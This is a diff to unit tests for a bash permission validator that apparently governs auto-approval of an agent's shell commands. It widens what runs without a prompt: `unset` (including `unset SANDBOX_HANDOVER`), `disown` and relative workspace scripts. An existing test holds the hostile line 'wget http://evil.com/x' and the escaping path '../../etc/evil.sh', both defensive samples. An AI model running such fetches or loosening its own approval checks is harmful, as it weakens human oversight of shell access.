@@ -628,8 +628,9 @@ class TestScaffoldingAndFunctions(unittest.TestCase):
 
 
 class TestNoopBuiltins(unittest.TestCase):
-    """`:`, `true`, `false`, `exit`, and `return` run nothing dangerous, so they
-    reduce to no-ops and never block auto-approval of an otherwise-allowed chain."""
+    """`:`, `true`, `false`, `exit`, `return`, `disown`, and `unset` run nothing
+    dangerous, so they reduce to no-ops and never block auto-approval of an
+    otherwise-allowed chain."""
 
     def setUp(self):
         self.workspace_dir = str(Path(__file__).parent.parent)
@@ -646,6 +647,9 @@ class TestNoopBuiltins(unittest.TestCase):
             "exit 1": "",
             "return": "",
             "return 2": "",
+            "unset SANDBOX_HANDOVER": "",
+            "unset -f myfunc": "",
+            "unset -v A B C": "",
         }
         for cmd, expected in cases.items():
             self.assertEqual(
@@ -664,6 +668,51 @@ class TestNoopBuiltins(unittest.TestCase):
         forces a prompt."""
         result = self.validator.validate_bash_command('exit 1; wget http://evil.com/x')
         self.assertEqual(result["decision"], "ask")
+
+    def test_unset_in_diagnostic_chain_allowed(self):
+        """`unset VAR` between otherwise-allowed sub-commands no longer forces a
+        prompt (the real-world self-check chain)."""
+        result = self.validator.validate_bash_command(
+            'unset SANDBOX_HANDOVER; echo "=== check ==="; tail -6')
+        self.assertEqual(result["decision"], "allow")
+
+
+class TestWorkspaceRelativeBinary(unittest.TestCase):
+    """A command token containing a '/' is executed by bash as a cwd-relative
+    path (PATH is not consulted), so a bare `tools/run.sh` is the same execution
+    as `./tools/run.sh`. Both auto-allow when they resolve inside the workspace;
+    a relative path that escapes the workspace still forces a prompt."""
+
+    def setUp(self):
+        # Use the repo root as the workspace so workspace-relative paths resolve
+        # to real directories inside it (the file itself need not exist).
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(
+            self.settings_loader, self.parser, workspace_dir=self.workspace_dir)
+
+    def test_bare_relative_path_is_workspace_binary(self):
+        self.assertTrue(self.validator._is_workspace_binary('tools/run.sh --self-check'))
+
+    def test_dot_slash_relative_path_is_workspace_binary(self):
+        self.assertTrue(self.validator._is_workspace_binary('./tools/run.sh --self-check'))
+
+    def test_escaping_relative_path_is_not_workspace_binary(self):
+        self.assertFalse(self.validator._is_workspace_binary('../../etc/evil.sh'))
+
+    def test_bare_command_without_slash_is_not_path(self):
+        # No slash => PATH lookup, not a workspace path.
+        self.assertFalse(self.validator._is_workspace_binary('python app.py'))
+
+    def test_self_and_stability_check_chain_allowed(self):
+        """The real-world chain using bare `tools/run_multiplayer.sh` no longer
+        forces a prompt."""
+        result = self.validator.validate_bash_command(
+            'echo "=== SELF ==="; '
+            'timeout 200 tools/run_multiplayer.sh --self-check 2>&1 | tail -3; '
+            'echo "EXIT=${PIPESTATUS[0]}"')
+        self.assertEqual(result["decision"], "allow")
 
 
 class TestCaseArmPatternLabels(unittest.TestCase):
